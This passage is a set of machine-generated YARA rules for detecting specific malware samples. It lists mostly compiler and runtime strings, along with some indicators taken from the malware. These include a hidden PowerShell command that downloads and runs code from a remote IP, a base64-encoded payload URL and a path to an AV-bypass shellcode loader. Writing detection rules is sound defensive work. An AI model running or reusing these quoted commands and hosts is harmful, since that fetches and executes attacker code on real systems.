      $x4 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x5 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileVirtualAllocabi mism" ascii /* score: '44.00'*/
      $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x7 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '43.00'*/
      $x8 = " to non-Go memory , locked to threadArab Standard TimeCommandLineToArgvWCreateFileMappingWCuba Standard TimeFiji Standard TimeGe" ascii /* score: '42.00'*/
      $x9 = ".lib section in a.out corruptedCentral Brazilian Standard TimeMountain Standard Time (Mexico)W. Central Africa Standard Timebad " ascii /* score: '41.50'*/
      $x10 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '38.00'*/
      $x11 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x12 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '35.00'*/
      $x13 = "atchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $s14 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii /* score: '30.00'*/
      $s15 = " is currently not supported for use in system callbackscasfrom_Gscanstatus:top gp->status is not in scan stategentraceback callb" ascii /* score: '30.00'*/
      $s16 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '28.00'*/
      $s17 = "structure needs cleaningupdate during transition bytes failed with errno= to unused region of spanAUS Central Standard TimeAUS E" ascii /* score: '27.00'*/
      $s18 = "CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetCommandLineWGetProce" ascii /* score: '27.00'*/
      $s19 = "ttempted to add zero-sized address rangegcSweep being done but phase is not GCoffmheap.freeSpanLocked - invalid span statemheap." ascii /* score: '27.00'*/
      $s20 = "ectOffsruntime: P runtime: g runtime: p scheddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll B (" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule sig_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c {
   meta:
      description = "mw - file 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
   strings:
      $x1 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWEgyptian_HieroglyphsGetAcceptExSockaddrsGetCurre" ascii /* score: '58.00'*/
      $x2 = "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263" ascii /* score: '57.00'*/
      $x3 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x4 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyzGo pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupte" ascii /* score: '44.00'*/
      $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x7 = "Bidi_ControlGetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibraryWMeetei_MayekPahawh_HmongReadCons" ascii /* score: '44.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '43.00'*/
      $x9 = " to non-Go memory , locked to threadCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLo" ascii /* score: '42.00'*/
      $x10 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '41.50'*/
      $x11 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '38.00'*/
      $x12 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '35.00'*/
      $x14 = "ymbolicLinkWCryptReleaseContextGC work not flushedGetCurrentProcessIdGetSystemDirectoryWGetTokenInformationIDS_Binary_OperatorKh" ascii /* score: '31.00'*/
      $s15 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '28.00'*/
      $s16 = " entryfreeIndex is not validgetenv before env initheadTailIndex overflowinteger divide by zerointerface conversion: kernel32.dll" ascii /* score: '28.00'*/
      $s17 = " is currently not supported for use in system callbackscasfrom_Gscanstatus:top gp->status is not in scan statecipher.NewCBCDecry" ascii /* score: '27.00'*/
      $s18 = "structure needs cleaningxlKIcoFPKG2OS5ZoQLhVkQ== bytes failed with errno= to unused region of spanGODEBUG: can not enable \"GetQ" ascii /* score: '27.00'*/
      $s19 = "out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledreflect.Value.Typeruntime." ascii /* score: '26.00'*/
      $s20 = "runtime: p scheddetailsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll B (" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule sig_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9 {
   meta:
      description = "mw - file 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '51.00'*/
      $x3 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x4 = "152587890625762939453125Bidi_ControlCIDR addressGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '47.00'*/
      $x5 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x6 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x8 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '42.00'*/
      $x9 = "0123456789abcdefghijklmnopqrstuvwxyz4440892098500626161694526672363281256ba7b810-9dad-11d1-80b4-00c04fd430c86ba7b811-9dad-11d1-8" ascii /* score: '42.00'*/
      $x10 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '42.00'*/
      $x11 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x12 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid UUID length: %dinvalid m->lo" ascii /* score: '35.00'*/
      $x13 = " is currently not supported for use in system callbackscasfrom_Gscanstatus:top gp->status is not in scan statecipher.NewCBCDecry" ascii /* score: '35.00'*/
      $x14 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '35.00'*/
      $x15 = "structure needs cleaningupdate during transition bytes failed with errno= to unused region of span2910383045673370361328125AUS C" ascii /* score: '35.00'*/
      $x16 = "476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushVie" ascii /* score: '32.00'*/
      $s17 = "ormat errorg already scannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overflownil resource bodyno data availab" ascii /* score: '30.00'*/
      $s18 = ": P runtime: g runtime: p scheddetailsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll B (" fullword ascii /* score: '26.00'*/
      $s19 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWDnsNameCompare_WDuplicateTokenEx" ascii /* score: '25.00'*/
      $s20 = "needmheapSpecialmspanSpecialnetapi32.dllno such hostnot pollableraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptshor" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule sig_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6 {
   meta:
      description = "mw - file 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '73.50'*/
      $x2 = "entersyscallgcBitsArenasgcpacertracegetaddrinfowharddecommithmac-sha256.host is downhttp2debug=1http2debug=2illegal seekinvalid " ascii /* score: '72.50'*/
      $x3 = "; EDNS: version asn1: Unmarshal recipient value is nil chain is not signed by an acceptable CAcipher: incorrect tag size given t" ascii /* score: '71.50'*/
      $x4 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '67.50'*/
      $x5 = "GetNamedSecurityInfoWGetProfilesDirectoryWGetVolumeInformationWInscriptional_PahlaviInternal Server ErrorLookupPrivilegeValueWMa" ascii /* score: '66.50'*/
      $x6 = "; DNSSEC ALGORITHM UNDERSTOOD: bad input point: low order pointbufio: invalid use of UnreadBytebufio: invalid use of UnreadRuneb" ascii /* score: '65.50'*/
      $x7 = "SubscribeServiceChangeNotificationsattempt to clear non-empty span setchacha20: output smaller than inputcrypto/md5: invalid has" ascii /* score: '61.00'*/
      $x8 = "%susage: portforward [-f] bind_port target/portforward stop bind_port26959946667150639794667015087019625940457807714424391721682" ascii /* score: '58.50'*/
      $x9 = ".__cfduid=atomicor8bad indirbad prunebad rcodebad rdatabase64urlbus errorchan sendcomplex64connectexcopystackcpu-totalctxt != 0d" ascii /* score: '56.50'*/
      $x10 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625AdjustTokenPrivileges error: %sC:" ascii /* score: '56.50'*/
      $x11 = "; address type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too largebidirule: failed Bidi " ascii /* score: '56.50'*/
      $x12 = "streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8unexpected buffer len=%vwmi: invalid entity typex509: ma" ascii /* score: '56.50'*/
      $x13 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Entering into ienumunknown.Next()...Go pointer stored in" ascii /* score: '56.50'*/
      $x14 = "CoCreateGuidCoInitializeContent TypeContent-TypeCookie.ValueCreateEventWCreateMutexWCreateThreadDNSSEC BogusECDSA-SHA256ECDSA-SH" ascii /* score: '55.00'*/
      $x15 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii /* score: '53.00'*/
      $x16 = "; UPDATE LEASE: bad TinySizeClassbad key algorithmcommand timed outdebugPtrmask.lockdecryption failedentersyscallblockexec forma" ascii /* score: '46.00'*/
      $x17 = "()<>@,;:\\\"/[]?= , not a function.WithValue(type 0123456789ABCDEF0123456789abcdef2384185791015625: value of type Already Report" ascii /* score: '43.00'*/
      $x18 = "%stls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verif" ascii /* score: '42.50'*/
      $x19 = "application/octet-streambad defer entry in panicbypassed recovery failedcan't scan our own stackcertificate unobtainablechacha20" ascii /* score: '42.00'*/
      $x20 = "%shttp2: Transport: cannot retry err [%v] after Request.Body was written; define Request.GetBody to avoid this error394020061963" ascii /* score: '42.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      1 of ($x*)
}

rule sig_108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f {
   meta:
      description = "mw - file 108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f"
   strings:
      $s1 = "SystemP=E" fullword ascii /* base64 encoded string 'K+-zc' */ /* score: '24.00'*/
      $s2 = "'TList<System.Zip.TZipHeader>.TEmptyFunc" fullword ascii /* score: '22.00'*/
      $s3 = "TDictionary<System.Zip.TZipCompression,System.Generics.Collections.TPair<System.Zip.TStreamConstructor,System.Zip.TStreamConstru" ascii /* score: '21.00'*/
      $s4 = "TDictionary<System.Zip.TZipCompression,System.Generics.Collections.TPair<System.Zip.TStreamConstructor,System.Zip.TStreamConstru" ascii /* score: '21.00'*/
      $s5 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s6 = " IComparer<System.Zip.TZipHeader>" fullword ascii /* score: '18.00'*/
      $s7 = "OnExecuteHrI" fullword ascii /* score: '18.00'*/
      $s8 = "SystemxWE" fullword ascii /* base64 encoded string 'K+-zlV' */ /* score: '17.00'*/
      $s9 = "TDictionary<System.Zip.TZipCompression,System.Generics.Collections.TPair<System.Zip.TStreamConstructor,System.Zip.TStreamConstru" ascii /* score: '16.00'*/
      $s10 = "TDictionary<System.Zip.TZipCompression,System.Generics.Collections.TPair<System.Zip.TStreamConstructor,System.Zip.TStreamConstru" ascii /* score: '16.00'*/
      $s11 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\sys\\System.SysUtils.pas" fullword wide /* score: '16.00'*/
      $s12 = "BTDictionary<System.Pointer,System.Rtti.TRttiObject>.TKeyEnumeratorP" fullword ascii /* score: '15.00'*/
      $s13 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s15 = "BTDictionary<System.TypInfo.PTypeInfo,System.string>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s16 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s17 = "\"TEnumerator<System.Zip.TZipHeader>4" fullword ascii /* score: '15.00'*/
      $s18 = "TList<System.Zip.TZipHeader>2" fullword ascii /* score: '15.00'*/
      $s19 = "TList<System.Zip.TZipHeader>" fullword ascii /* score: '15.00'*/
      $s20 = "\"TEnumerable<System.Zip.TZipHeader>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4ac037e {
   meta:
      description = "mw - file 436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4ac037e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4ac037e"
   strings:
      $s1 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s2 = "OnExecutexbI" fullword ascii /* score: '18.00'*/
      $s3 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\sys\\System.SysUtils.pas" fullword wide /* score: '16.00'*/
      $s4 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
      $s5 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s6 = "BTDictionary<System.TypInfo.PTypeInfo,System.string>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s7 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s8 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s9 = "BTDictionary<System.Pointer,System.Rtti.TRttiObject>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s10 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.TypInfo.pas" fullword wide /* score: '15.00'*/
      $s11 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Generics.Defaults.pas" fullword wide /* score: '15.00'*/
      $s12 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Rtti.pas" fullword wide /* score: '15.00'*/
      $s13 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Classes.pas" fullword wide /* score: '15.00'*/
      $s14 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumerator0" fullword ascii /* score: '15.00'*/
      $s15 = "3TList<System.Rtti.TPrivateHeap.THeapItem>.ParrayofTP#F" fullword ascii /* score: '15.00'*/
      $s16 = "TComponent.GetObservers$ActRec tM" fullword ascii /* score: '15.00'*/
      $s17 = "System.SysUtilsp" fullword ascii /* score: '14.00'*/
      $s18 = "4TList<System.Rtti.TPrivateHeap.THeapItem>.TEmptyFunc" fullword ascii /* score: '14.00'*/
      $s19 = " TList<System.Pointer>.TEmptyFunc" fullword ascii /* score: '14.00'*/
      $s20 = " TList<System.TObject>.TEmptyFunc" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641 {
   meta:
      description = "mw - file c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "c879b4f8bd38ddc5797d625effb573e7478dbc57efb3c99593c2a5a98d12b641"
   strings:
      $x1 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '56.00'*/
      $x2 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '52.00'*/
      $x3 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '49.00'*/
      $x4 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '49.00'*/
      $x5 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '49.00'*/
      $x6 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '49.00'*/
      $x7 = "C:\\Users\\aaa\\Desktop\\0_tools\\0000_Maye.1.2.4-20210701\\tools\\bypass\\rust_shellcooler-main\\shellcooler-main\\target\\debu" ascii /* score: '48.00'*/
      $s8 = "assertion failed: key_len <= key.len()C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\openssl-0.10.55" ascii /* score: '26.00'*/
      $s9 = "assertion failed: key_len <= key.len()C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\openssl-0.10.55" ascii /* score: '26.00'*/
      $s10 = "attempt to subtract with overflowC:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\windows-0.48.0\\src\\i" ascii /* score: '24.00'*/
      $s11 = ".llvm.C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.21\\src\\lib.rsN" fullword ascii /* score: '23.00'*/
      $s12 = "C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\openssl-0.10.55\\src\\error.rs" fullword ascii /* score: '23.00'*/
      $s13 = "C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\windows-0.48.0\\src\\core\\strings\\hstring.rst" fullword ascii /* score: '23.00'*/
      $s14 = "compiler: cl /Zi /Fdossl_static.pdb /MT /Zl /Gs0 /GF /Gy /W3 /wd4090 /nologo /O2 -DL_ENDIAN -DOPENSSL_PIC" fullword ascii /* score: '23.00'*/
      $s15 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.21\\src\\v0.rs" fullword ascii /* score: '23.00'*/
      $s16 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\rustc-demangle-0.1.21\\src\\legacy.rs" fullword ascii /* score: '23.00'*/
      $s17 = "assertion failed: state_and_queue.addr() & STATE_MASK == RUNNINGOnce instance has previously been poisoned" fullword ascii /* score: '20.00'*/
      $s18 = "ossl_statem_client_post_process_message" fullword ascii /* score: '20.00'*/
      $s19 = "C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\openssl-sys-0.9.90\\src\\lib.rs" fullword ascii /* score: '20.00'*/
      $s20 = "C:\\Users\\aaa\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\windows-0.48.0\\src\\core\\strings\\mod.rs" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      1 of ($x*) and 4 of them
}

rule sig_6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594 {
   meta:
      description = "mw - file 6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6e705467c0c083d343ad4f9e2833cd229605257b034bd3c4ac3342b156fb1594"
   strings:
      $x1 = "wwanmm.dll" fullword ascii /* reversed goodware string 'lld.mmnaww' */ /* score: '33.00'*/
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s3 = "srv.dll" fullword ascii /* score: '20.00'*/
      $s4 = " #%d - %s" fullword ascii /* score: '12.00'*/
      $s5 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s6 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s7 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s8 = "* \\vvd" fullword ascii /* score: '9.00'*/
      $s9 = ".data$rs" fullword ascii /* score: '8.00'*/
      $s10 = "zyxwvutsrqponmlk" fullword ascii /* score: '8.00'*/
      $s11 = "abcdbcdecdefdef" ascii /* score: '8.00'*/
      $s12 = "abcdefghijklmnop" fullword ascii /* score: '8.00'*/
      $s13 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s14 = "regex_error(error_stack): There was insufficient memory to determine whether the regular expression could match the specified ch" ascii /* score: '7.00'*/
      $s15 = "UAWAVAUATVWSH" fullword ascii /* score: '6.50'*/
      $s16 = "UAWAVATVWSH" fullword ascii /* score: '6.50'*/
      $s17 = "UAWAVVWSH" fullword ascii /* score: '6.50'*/
      $s18 = "UAVVWSH" fullword ascii /* score: '6.50'*/
      $s19 = "AWAVATVWSH" fullword ascii /* score: '6.50'*/
      $s20 = "AVVWUSH" fullword ascii /* score: '6.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914 {
   meta:
      description = "mw - file 9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "9b2b902f5fd53b72cabfcc0e0191c876c92c1c748bcdbb7c00f9d62d7ba76914"
   strings:
      $x1 = "C:\\Users\\s8er\\Downloads\\cryptopp870\\gf2n_simd.cpp" fullword ascii /* score: '33.00'*/
      $x2 = "C:\\Users\\s8er\\Downloads\\cryptopp870\\sha_simd.cpp" fullword ascii /* score: '33.00'*/
      $x3 = "C:\\Users\\s8er\\Downloads\\cryptopp870\\sse_simd.cpp" fullword ascii /* score: '33.00'*/
      $x4 = "C:\\Users\\s8er\\Downloads\\cryptopp870\\rijndael_simd.cpp" fullword ascii /* score: '33.00'*/
      $s5 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s6 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s7 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s8 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s9 = "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1" wide /* score: '19.00'*/
      $s10 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s11 = "8http://crl.sectigo.com/SectigoPublicCodeSigningCAR36.crl0y" fullword ascii /* score: '16.00'*/
      $s12 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s13 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s14 = "8http://crt.sectigo.com/SectigoPublicCodeSigningCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s15 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s16 = "aHR0cDovLzk1LjE2NC4xOC4xMDEvZmZm" fullword ascii /* base64 encoded string 'http://95.164.18.101/fff' */ /* score: '14.00'*/
      $s17 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
      $s18 = "cs@crosscert.com0" fullword ascii /* score: '11.00'*/
      $s19 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s20 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule b6eb73da6c308532e9f160bcd06bda91799de0cac7a282ff1f404f23ca6b694f {
   meta:
      description = "mw - file b6eb73da6c308532e9f160bcd06bda91799de0cac7a282ff1f404f23ca6b694f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b6eb73da6c308532e9f160bcd06bda91799de0cac7a282ff1f404f23ca6b694f"
   strings:
      $x1 = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://1.13.17.173:1234/a'))\"" fullword ascii /* score: '39.00'*/
      $x2 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $x3 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '35.00'*/
      $s4 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s5 = "\\libshell.exe" fullword ascii /* score: '21.00'*/
